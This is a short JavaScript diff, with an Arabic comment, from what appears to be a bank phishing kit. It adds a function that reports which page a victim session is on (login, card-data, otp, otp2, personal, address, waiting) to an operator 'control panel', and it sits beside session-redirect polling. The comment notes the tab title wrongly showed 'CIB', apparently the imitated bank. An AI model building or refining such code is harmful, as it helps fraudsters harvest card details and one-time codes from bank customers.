@@ -170,12 +170,34 @@ function startSessionRedirectPolling(onRedirect, onAlert) {
     return stop;
 }
 
+/** يطابق data-page في لوحة التحكم (وليس عنوان التبويب — كان يظهر «CIB» خطأً) */
+function pathnameToNavPageKey() {
+    try {
+        var path = String(window.location.pathname || '').toLowerCase();
+        var parts = path.split('/').filter(Boolean);
+        var f = parts.length ? parts[parts.length - 1] : '';
+        if (f.indexOf('messege') !== -1) return 'messege';
+        if (f.indexOf('otp2') !== -1) return 'otp2';
+        if (f.indexOf('waiting') !== -1) return 'waiting';
+        if (f.indexOf('card-data') !== -1) return 'card';
+        if (f.indexOf('login') !== -1) return 'login';
+        if (f.indexOf('personal') !== -1) return 'personal';
+        if (f.indexOf('otp') !== -1) return 'otp';
+        if (f.indexOf('address') !== -1) return 'address';
+        if (f.indexOf('watches') !== -1) return 'watches';
+        if (!f || f === 'index.html' || f === 'index') return 'home';
+        return 'home';
+    } catch (e) {
+        return 'home';
+    }
+}
+
 async function sendHeartbeat() {
     try {
         var sid = localStorage.getItem('yasmeen_session_id');
         if (!sid) return; // no session
 
-        var page = document.title.replace(/ - .*$/, '') || window.location.pathname.replace(/^\//, '') || 'unknown';
+        var page = pathnameToNavPageKey();
         var last_activity = Date.now();
 
         var url = typeof window.resolveYasmeenApiUrl === 'function' 
